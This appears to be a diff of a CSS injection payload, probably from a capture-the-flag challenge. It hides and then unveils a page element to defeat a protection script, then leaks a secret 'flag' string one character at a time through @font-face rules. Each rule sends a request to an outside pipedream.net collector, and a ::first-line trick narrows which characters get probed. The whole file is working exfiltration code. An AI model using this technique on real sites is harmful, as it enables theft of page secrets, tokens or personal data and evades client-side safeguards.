@@ -1,21 +1,21 @@
 /* beacon */
 body { background-image: url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=BEACON'); }
 
-/* Phase 1: content-visibility:hidden -> checkVisibility()=false -> protection JS restores flag text */
-/* No !important so animation can override */
-#page {
-  content-visibility: hidden;
-  animation: unveil 0.001s 0.3s forwards;
-}
+/* Bypass */
+#page { content-visibility: hidden; animation: unveil 0.001s 0.3s forwards; }
+@keyframes unveil { to { content-visibility: visible; } }
 #flag { display: block !important; }
 
-/* Phase 2: 0.3s later reveal page -> browser lays out #flag -> font requests fire */
-@keyframes unveil {
-  to { content-visibility: visible; }
+/* CONTENT-ONLY probe: 13ch width forces prefix onto line 1 */
+/* ::first-line override removes probes from line 1 chars   */
+#flag {
+  font-family: p97, p98, p99, p100, p101, p102, p103, p104, p105, p106, p107, p108, p109, p110, p111, p112, p113, p114, p115, p116, p117, p118, p119, p120, p121, p122, p48, p49, p50, p51, p52, p53, p54, p55, p56, p57, p95, p123, p125, monospace;
+  width: 13ch;
+  white-space: pre-wrap;
+  word-break: break-all;
+  overflow: visible;
 }
-
-/* Font probes */
-#flag { font-family: p97, p98, p99, p100, p101, p102, p103, p104, p105, p106, p107, p108, p109, p110, p111, p112, p113, p114, p115, p116, p117, p118, p119, p120, p121, p122, p48, p49, p50, p51, p52, p53, p54, p55, p56, p57, p95, p123, p125, monospace; }
+#flag::first-line { font-family: monospace !important; }
 
 @font-face{font-family:p97;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=a');unicode-range:U+0061}
 @font-face{font-family:p98;src:url('https://eowjcwr61nsdf8j.m.pipedream.net/?c=b');unicode-range:U+0062}
